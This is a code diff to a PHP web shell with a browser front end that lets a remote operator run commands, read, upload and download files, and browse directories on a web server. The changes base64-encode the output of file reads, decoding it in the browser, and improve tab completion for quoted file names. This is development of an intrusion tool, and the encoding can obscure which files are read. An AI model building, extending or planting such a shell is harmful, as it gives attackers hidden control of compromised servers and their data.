@@ -1461,6 +1461,7 @@ function doTar(string $path):array{
 * return: Array with the output, CWD, and a flag instructing the client side to either escape or display as HTML
 **/
 function featureShell(string $cmdline, string $cwd):array {
+  $encoded = false;
   $raw = false;
   $cmdline = trim($cmdline);
   $idx = strpos($cmdline, " ");
@@ -1480,7 +1481,8 @@ function featureShell(string $cmdline, string $cwd):array {
   if (array_key_exists($command, COMMANDS)){
     switch($command){
       case "cat":
-        $out .= doCat(trim(substr($cmdline, 4)));
+        $out .= base64_encode(doCat(trim(substr($cmdline, 4))));
+        $encoded = true;
         break;
       case "cd":
         $out .= doCd(trim(substr($cmdline, 3)));
@@ -1550,14 +1552,16 @@ function featureShell(string $cmdline, string $cwd):array {
     return array(
         "stdout" => $out,
         "cwd" => getcwd(),
-        "raw" => $raw
+        "raw" => $raw,
+        "encoded" => $encoded
     );
   }
   else{
     return array(
         "stdout" => "No such command $command. Type 'help' or '?' to get help",
         "cwd" => getcwd(),
-        "raw" => $raw
+        "raw" => $raw,
+        "encoded" => false
     );
   }
 }
@@ -1584,6 +1588,7 @@ function featureHint(string $fileName, string $cwd, string $type, string $rest):
   }
   chdir($cwd);
   $fchar = "";
+  //isolate first char if it is a quote (single ou double)
   if (strlen($fileName) && ($fileName[0] == "'" || $fileName[0] == '"')){
     $fchar = $fileName[0];
     $fileName = substr($fileName, 1);
@@ -1593,16 +1598,30 @@ function featureHint(string $fileName, string $cwd, string $type, string $rest):
   $match_scan_dir = [];
   $idx = strrpos($fileName, "/");
   if ($idx === false || !strlen($fileName)){
+    //if $fileName refers to a file, or if it is empty, scan the current folder
     foreach (scandir(".", SCANDIR_SORT_ASCENDING) as $x){
       if (str_starts_with($x, $fileName) || !strlen($fileName) && strcmp(".", $x) && strcmp("..", $x)){
         if (is_dir($x)){$x .= "/"; }
         array_push($match_scan_dir, $x);
       }
     }
+    if (count($match_scan_dir) == 1){
+      if ($fchar){
+        if (str_ends_with($match_scan_dir[0], "/")){
+          $match_scan_dir[0] = $fchar.$match_scan_dir[0];
+        }else{
+          $match_scan_dir[0] = $fchar.$match_scan_dir[0].$fchar;
+        }
+      }
+      else{
+        $match_scan_dir[0] = $match_scan_dir[0];
+      }
+    }
   }
   else{
-    $dir = substr($fileName, 0, $idx);
-    if (!strlen($dir)) $dir = "/"; //root
+    //otherwise, it means that $fileName refers to a folder or a file in another directory
+    $dir = substr($fileName, 0, $idx); //keep the directory name
+    if (!strlen($dir)) $dir = "/"; //if empty, it's the root folder
     $path = realpath($dir);
     if (!file_exists($path)){
       return array(
@@ -1610,26 +1629,30 @@ function featureHint(string $fileName, string $cwd, string $type, string $rest):
         'rest' => $rest
       );
     }
-    $fileName = substr($fileName, $idx+1);
+    $fileName = substr($fileName, $idx+1); // keep the filename, after the last '/'
     foreach (scandir($path, SCANDIR_SORT_ASCENDING) as $x){
-      if (str_starts_with($x, $fileName) || !strlen($fileName) && strcmp(".", $x) && strcmp("..", $x)){
+      if (str_starts_with($x, $fileName) || !strlen($fileName) && strcmp(".", $x) && strcmp("..", $x)){ //for each file/dir, check if:
+        // * it matches the search pattern, if any
+        // * if there is no search pattern, show them all except . and ..
         if (is_dir($dir."/".$x)){$x .= "/";}
         array_push($match_scan_dir, $x);
       }
     }
     //otherwise it is likely that only .. will match and therefore take over the input
     if (count($match_scan_dir) == 1){
-      $match_scan_dir[0] = ($dir != "/" ? $dir."" : "")."/".$match_scan_dir[0];
+      if ($fchar){
+        if (str_ends_with($match_scan_dir[0], "/")){
+          $match_scan_dir[0] = $fchar.($dir != "/" ? $dir."" : "")."/".$match_scan_dir[0];
+        }
+        else{
+          $match_scan_dir[0] = $fchar.($dir != "/" ? $dir."" : "")."/".$match_scan_dir[0].$fchar;
+        }
+      }
+      else{
+        $match_scan_dir[0] = ($dir != "/" ? $dir."" : "")."/".$match_scan_dir[0];
+      }
     }
   }
-  if ($fchar && count($match_scan_dir) == 1){
-    if (str_ends_with($match_scan_dir[0], "/") || $rest[0] == $fchar){
-      $match_scan_dir[0] = $fchar.$match_scan_dir[0];
-    }else{
-        $match_scan_dir[0] = $fchar.$match_scan_dir[0].$fchar." ";
-    }
-  }
-  
   return array(
       'files' => $match_scan_dir,
       'rest' => $rest
@@ -1858,12 +1881,17 @@ if (isset($_GET["feature"])) {
                 eShellContent.scrollTop = eShellContent.scrollHeight;
             }
 
-            function _insertStdout(stdout, raw) {
+            function _insertStdout(stdout, raw, encoded) {
                 if (raw) {
                   eShellContent.innerHTML += stdout;
                 }
                 else {
-                  eShellContent.innerHTML += escapeHtml(stdout);
+                  if (encoded){
+                    eShellContent.innerHTML += escapeHtml(atob(stdout));
+                  }
+                  else{
+                    eShellContent.innerHTML += escapeHtml(stdout);
+                  }
                 }
                 eShellContent.scrollTop = eShellContent.scrollHeight;
             }
@@ -1885,7 +1913,7 @@ if (isset($_GET["feature"])) {
                         if (response.hasOwnProperty('file')) {
                             featureDownload(response.name, response.file)
                         } else {
-                            _insertStdout(response.stdout, response.raw);
+                            _insertStdout(response.stdout, response.raw, response.encoded);
                             updateCwd(response.cwd);
                         }
                     });
@@ -1939,7 +1967,7 @@ if (isset($_GET["feature"])) {
                     }
                     else {
                         _insertCommand(eShellCmdInput.value);
-                        _insertStdout(data.files.join("\n"), false);
+                        _insertStdout(data.files.join("\n"), false, false);
                     }
                     var curPos = eShellCmdInput.value.length - data.rest.length;
                     eShellCmdInput.focus(); 
@@ -1996,7 +2024,7 @@ if (isset($_GET["feature"])) {
                 document.body.appendChild(element);
                 element.click();
                 document.body.removeChild(element);
-                _insertStdout('Done.', false);
+                _insertStdout('Done.', false, false);
             }
 
             function featureUpload(path) {
@@ -2008,11 +2036,11 @@ if (isset($_GET["feature"])) {
                     var promise = getBase64(element.files[0]);
                     promise.then(function (file) {
                         makeRequest('?feature=upload', {path: path, file: file, cwd: CWD}, function (response) {
-                            _insertStdout(response.stdout, response.raw);
+                            _insertStdout(response.stdout, response.raw, false);
                             updateCwd(response.cwd);
                         });
                     }, function () {
-                        _insertStdout('An unknown client-side error occurred.', false);
+                        _insertStdout('An unknown client-side error occurred.', false, false);
                     });
                 });
                 element.click();
